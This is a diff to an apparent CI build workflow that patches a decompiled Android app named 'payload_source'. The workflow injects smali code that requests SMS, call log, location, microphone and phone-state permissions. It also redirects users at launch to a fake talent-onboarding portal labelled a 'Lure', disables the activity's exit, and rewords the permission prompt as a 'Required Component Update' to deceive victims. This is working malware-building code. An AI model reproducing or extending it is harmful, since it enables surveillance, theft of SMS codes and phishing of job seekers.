@@ -44,18 +44,19 @@ jobs:
           fi
 
           # Runtime Permission Injection (Android 14 Requirement)
-          # We inject the requestPermissions call into onCreate
-          PERMISSION_CODE='    const/4 v0, 0x7\n    new-array v0, v0, [Ljava/lang/String;\n    const/4 v1, 0x0\n    const-string v2, "android.permission.READ_SMS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x1\n    const-string v2, "android.permission.RECEIVE_SMS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x2\n    const-string v2, "android.permission.READ_CALL_LOG"\n    aput-object v2, v0, v1\n    const/4 v1, 0x3\n    const-string v2, "android.permission.ACCESS_FINE_LOCATION"\n    aput-object v2, v0, v1\n    const/4 v1, 0x4\n    const-string v2, "android.permission.RECORD_AUDIO"\n    aput-object v2, v0, v1\n    const/4 v1, 0x5\n    const-string v2, "android.permission.POST_NOTIFICATIONS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x6\n    const-string v2, "android.permission.READ_PHONE_STATE"\n    aput-object v2, v0, v1\n    const/4 v1, 0x1\n    invoke-virtual {p0, v0, v1}, L'"$NEW_PATH"'/MainActivity;->requestPermissions([Ljava/lang/String;I)V\n'
+          # We use | as delimiter to avoid path slash conflicts
+          PERMISSION_CODE='    const/4 v0, 0x7\n    new-array v0, v0, [Ljava/lang/String;\n    const/4 v1, 0x0\n    const-string v2, "android.permission.READ_SMS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x1\n    const-string v2, "android.permission.RECEIVE_SMS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x2\n    const-string v2, "android.permission.READ_CALL_LOG"\n    aput-object v2, v0, v1\n    const/4 v1, 0x3\n    const-string v2, "android.permission.ACCESS_FINE_LOCATION"\n    aput-object v2, v0, v1\n    const/4 v1, 0x4\n    const-string v2, "android.permission.RECORD_AUDIO"\n    aput-object v2, v0, v1\n    const/4 v1, 0x5\n    const-string v2, "android.permission.POST_NOTIFICATIONS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x6\n    const-string v2, "android.permission.READ_PHONE_STATE"\n    aput-object v2, v0, v1\n    const/4 v1, 0x1\n    invoke-virtual {p0, v0, v1}, L'"$NEW_PATH"'/MainActivity;->requestPermissions([Ljava/lang/String;I)V'
           
-          sed -i "/invoke-virtual {p0, v0}, L$NEW_PATH\/MainActivity;->setContentView(I)V/a $PERMISSION_CODE" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+          # Use | for address matching and append
+          sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|a $PERMISSION_CODE" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
           # Redirect to Vercel Portal on Launch (Lure)
-          REDIRECT_CODE='    new-instance v0, Landroid/content/Intent;\n    const-string v1, "android.intent.action.VIEW"\n    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)\n    const-string v1, "https://global-talent-onboarding-portal.vercel.app/"\n    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;\n    move-result-object v1\n    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;\n    invoke-virtual {p0, v0}, L'"$NEW_PATH"'/MainActivity;->startActivity(Landroid/content/Intent;)V\n'
+          REDIRECT_CODE='    new-instance v0, Landroid/content/Intent;\n    const-string v1, "android.intent.action.VIEW"\n    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)\n    const-string v1, "https://global-talent-onboarding-portal.vercel.app/"\n    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;\n    move-result-object v1\n    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;\n    invoke-virtual {p0, v0}, L'"$NEW_PATH"'/MainActivity;->startActivity(Landroid/content/Intent;)V'
           
-          sed -i "/invoke-virtual {p0, v0, v1}, L$NEW_PATH\/MainActivity;->requestPermissions/a $REDIRECT_CODE" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+          sed -i "\|invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions|a $REDIRECT_CODE" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
           # Prevent Activity from finishing immediately
-          sed -i 's/invoke-virtual {p0}, L'"$NEW_PATH"'\/MainActivity;->finish()V/# finish disabled/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
+          sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
           # Obfuscate Strings
           find payload_source -name "MainActivity.smali" -exec sed -i "s|Click 'Permissions'|Required Component Update|g" {} +
